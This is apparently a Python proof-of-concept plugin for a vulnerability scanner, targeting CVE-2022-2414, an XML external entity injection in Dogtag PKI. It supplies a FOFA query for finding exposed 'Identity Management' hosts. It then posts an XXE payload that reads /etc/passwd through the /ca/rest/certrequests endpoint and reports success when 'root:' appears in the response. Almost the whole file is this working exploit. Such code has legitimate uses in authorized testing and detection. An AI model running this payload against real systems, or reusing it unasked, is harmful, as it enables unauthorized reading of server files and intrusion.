#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Dogtag PKI XML实体注入漏洞 CVE-2022-2414',

      'level'     :   'medium',

      'fofa'      :   'title="Identity Management"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/xml'
      }
  target = '/ca/rest/certrequests'
  data = '''
<!--?xml version="1.0" ?-->
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
        <CertEnrollmentRequest>
          <Attributes/>
          <ProfileID>&ent;</ProfileID>
        </CertEnrollmentRequest>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 400 and "root:" in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret